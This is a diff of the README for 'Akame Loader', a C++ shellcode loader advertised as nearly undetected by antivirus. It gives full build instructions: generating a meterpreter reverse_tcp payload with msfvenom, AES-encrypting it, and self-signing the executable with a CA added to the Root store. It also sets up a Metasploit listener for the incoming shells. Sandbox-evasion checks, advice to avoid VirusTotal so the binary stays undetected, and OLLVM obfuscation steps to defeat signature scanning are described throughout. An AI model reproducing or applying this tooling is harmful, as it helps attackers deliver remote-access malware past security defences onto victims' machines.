@@ -2,7 +2,7 @@
 <p align="center">
   <img width="250" height="250" src="https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/akame.png" width="250" height="250">
 </p>
-<h4 align="center">An open source, UD (3/71) shellcode loader written in C++17</h4>
+<h4 align="center">An open source, UD (3/71) shellcode loader written in C++</h4>
 
 ## Details
 Icon: https://icon-icons.com/icon/Halloween-eye/109170
@@ -10,13 +10,13 @@ Icon: https://icon-icons.com/icon/Halloween-eye/109170
 | ------ | ------ |
 | Name | Akame Loader |
 | Author | WtfIsThis |
-| Language | C++17 |
+| Language | C++ |
 | Platform | Windows |
-| Version | 1.0 |
+| Version | 1.1 |
 | License | MIT |
 | Libraries | kernel32, advapi32, crypt32 |
 | Encryption | AES256 |
-| Build | Release - x64 |
+| Build | Release |
 
 ! If you change the encryption method and want to keep your executable UD for a longer period of time, don't use VirusTotal / AntiScan.me / any other site that distributes to security vendors.
 
@@ -25,25 +25,33 @@ Icon: https://icon-icons.com/icon/Halloween-eye/109170
 2. Checks the current hard disk, if the size is under 100GB it closes itself
 3. Sleeps for 10000ms (10s)
 4. Checks if any tickcount-related function was manipulated by a sandbox (by checking the hashes and comparing the time slept with the time elapsed on the machine), if something seems wrong, it closes itself
-5. Stores the IV, the encryption Key, and the encrypted payload as vectors
+5. Stores the IV, the encryption Key, and the encrypted payload as buffers
 6. Allocates a memory buffer for the payload
-7. Decrypts the payload (aes256) and closes itself if something doesn't work correctly
+7. Decrypts the payload (AES256) and closes itself if something doesn't work correctly
 8. Copies the payload to a new buffer
-9. Makes the new buffer as executable (This is not done during the first allocation because it's suspicious that a memory space is ReadWriteExecute at the same time and AVs may flag it!)
-10. Executes the payload with an infinite thread (when the shellcode sends an 'exit' command, the process will close)
+9. Marks the memory space as executable (This is not done during the first allocation because it's suspicious to create a memory space which is ReadWriteExecute)
+10. Executes the payload
 
 ## How to build?
-**1. Generate a shellcode with metasploit<br>**
-- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*IP* LPORT=*PORT* -f raw > shellcode.bin
+**1. Generate shellcode<br>**
+- Metasploit: <br>
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*IP* LPORT=*PORT* -f raw > shellcode.bin
+- Native PE: <br>
+use [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode) to generate the shellcode
+- Managed PE: <br>
+use [donut](https://github.com/TheWover/donut) to generate the shellcode
 
 **2. Encrypt your shellcode with encrypt.exe<br>**
-- mv shellcode.bin \Akame Loader\x64\Release\Resources\ <br>
-- cd \Akame Loader\x64\Release\Resources\ <br>
-- (optional) encrypt --help<br>
-- encrypt.exe -l cpp -m file -i shellcode.bin -e random -o cli<br>
+- Metasploit: <br>
+`mv shellcode.bin \Akame Loader\x64\Release\Resources\` <br>
+`cd \Akame Loader\x64\Release\Resources\` <br>
+`encrypt --help (optional, to view the manual)`<br>
+`encrypt.exe -l cpp -m file -i shellcode.bin -e random -o cli`<br>
+- Other: <br>
+Use a python script ([example](https://github.com/djackreuter/shellcode-encryption)) to encrypt the shellcode with AES256.
 
 **3. Copy the output and paste it under the "payload" comment<br>**
-- Paste your IV key, your KEY and your BUFF into the existent vectors<br>
+- Paste your IV Key, your KEY and your shellcode into the existent buffers<br>
 
 **4. Change the resources<br>**
 - Add your icon, your company name, etc.
@@ -61,21 +69,24 @@ Icon: https://icon-icons.com/icon/Halloween-eye/109170
   
 **6. Add a certificate to your executable<br>**
   ! Change "Akame.exe" to your executable and AkameCert/AkameCA to whatever you want<br>
-- move Akame.exe Resources && cd Resources<br>
-- makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer<br>
-- certutil -user -addstore Root AkameCA.cer<br>
-- makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer<br>
-- pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx<br>
-- signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe
+- `move Akame.exe Resources && cd Resources`<br>
+- `makecert.exe -r -pe -n "CN=Akame CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv AkameCA.pvk AkameCA.cer`<br>
+- `certutil -user -addstore Root AkameCA.cer`<br>
+- `makecert.exe -pe -n "CN=Akame Cert" -a sha256 -cy end -sky signature -ic AkameCA.cer -iv AkameCA.pvk -sv AkameCert.pvk AkameCert.cer`<br>
+- `pvk2pfx.exe -pvk AkameCert.pvk -spc AkameCert.cer -pfx AkameCert.pfx`<br>
+- `signtool.exe sign /v /f AkameCert.pfx /t http://timestamp.digicert.com/?alg=sha1 Akame.exe`
   
 **7. Listen for incomming connections<br>**
-- msfconsole -q
-- use exploit/multi/handler
-- set payload windows/x64/meterpreter/reverse_tcp
-- (optional) show options
-- set LHOST *IP*
-- set LPORT *PORT*
-- exploit
+- Metasploit:<br>
+`msfconsole -q`<br>
+`use exploit/multi/handler`<br>
+`set payload windows/x64/meterpreter/reverse_tcp`<br>
+`show options` (optional)<br>
+`set LHOST *IP*`<br>
+`set LPORT *PORT*`<br>
+`exploit`<br>
+- Other:<br>
+start listening for connections
 
 ## Video POC
 Platform: Windows 10 x64 <br>
@@ -100,7 +111,34 @@ The loader was build with VS22 and signed with a sha1 certificate
 Link: https://www.virustotal.com/gui/file/68e6a25457093584a043ed3f721be9bc9b6456edd792cb4e30054e85bdc4119f
 </br><b>! Attention, the reason the loader gets a lot of detections now is because Virus Total distributes samples, this is completely normal. With simple code obfuscation / small changes you can obtain a new, FUD payload, don't be script kiddies / pasters, learn how to code, stay safe!</b>
 
-## What should be added to make it more advanced / functional?
+## What should be added to make it better?
+- Use LLVM obfuscation for anti-signature scanning (Control Flow Flattening, String Encryption, etc.)
+1. Install LLVM toolchain and clang compiler for VS 2022, go to Visual Studio -> Modify -> Individual Components:<br>
+(`C++ Clang Compiler for Windows` && `MSBuild support for LLVM (clang-cl) toolset`)
+2. Install the pre-compiled [OLLVM-17 files](https://github.com/DreamSoule/ollvm17/releases/tag/17.0.6)
+3. Navigate to `C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\Llvm\x64\bin` and copy the files that you downloaded from Github and overwrite
+4. Copy the following line and add it as "Additional Options" in Configuration Properties -> C/C++ -> Command Line<br>
+<img src="https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/commandLine.png">
+
+! The provided code is a set of parameters used with LLVM's obfuscation passes, here's a list of each parameter and what it does, parameters taken directly from ollvm-17(not official one) repo.<br>
+`bcf: This parameter is used for fake control flow.`<br>
+`bcf_prob: This parameter sets the false control flow confusion probability, which ranges from 1 to 100, with a default value of 70.`<br>
+`bcf_loop: This parameter sets the number of false control flow repetitions, with no limit and a default value of 2.`<br>
+`fla: This parameter is used for control flow flattening.`<br>
+`sub: This parameter is used for instruction replacement, specifically add/and/sub/or/xor.`<br>
+`sub_loop: This parameter sets the number of instruction substitutions, with no limit and a default value of 1.`<br>
+`sobf: This parameter is used for string obfuscation, but only for narrow characters.`<br>
+`split: This parameter is used for basic block split.`<br>
+`split_num: This parameter sets the number of splits of the original basic block, with no limit and a default value of 3.`<br>
+`ibr: This parameter is used for indirect branch.`<br>
+`icall: This parameter is used for indirect call, specifically call register.`<br>
+`igv: This parameter is used for indirect global variable.`<br>
+
+After that you only need to compile your solution and you will get a fairly large executable but with various flattening, encryption, substitution applied.
+Here's what you should get on analyzing the control flow graph with IDA:
+<img src="https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/graph.png">
+<img src="https://raw.githubusercontent.com/Wtf-Is-This-x1337/Akame-Loader/main/Images/graph1.png">
+
 - Create Mutex to avoid running multiple instances of akame on the same machine. POC:
 ```cpp
     // Check the mutex at the beginning
@@ -143,21 +181,9 @@ Link: https://www.virustotal.com/gui/file/68e6a25457093584a043ed3f721be9bc9b6456
       } while (Process32NextW(hSnapshot, &processEntry));
     }
 ```
-- Anti debugging (detecting analysis in general) <br>
-- Anti static analysis (function call obfuscation and also finding kernel32 location in the process environment block to avoid using GetModuleHandle and GetProcAddress). POC:
-```cpp
-BOOL (WINAPI*pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-
-pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect"); // Encrypt VirtualProtect with encrypt.exe, don't paste the plain text
-
-// Call pVirtualProtect instead of VirtualProtect
-BOOL rv = pVirtualProtect(...);
-
-/* With this method, we use GetModuleHandle and GetProcAddress, this can be even more suspicious, some workarounds:
-* API Hashing to hide GetProcAddress
-* Bootstrapping to hide GetModuleHandle
-*/
-```
+- Encrypt RTTI Info
+- Obfuscate PE Sections
+- Use Dynamic API Hashing/Resolving
 - Adding 'fake' imports to fill the import table and make it look more legitimate
 
 ## Properties
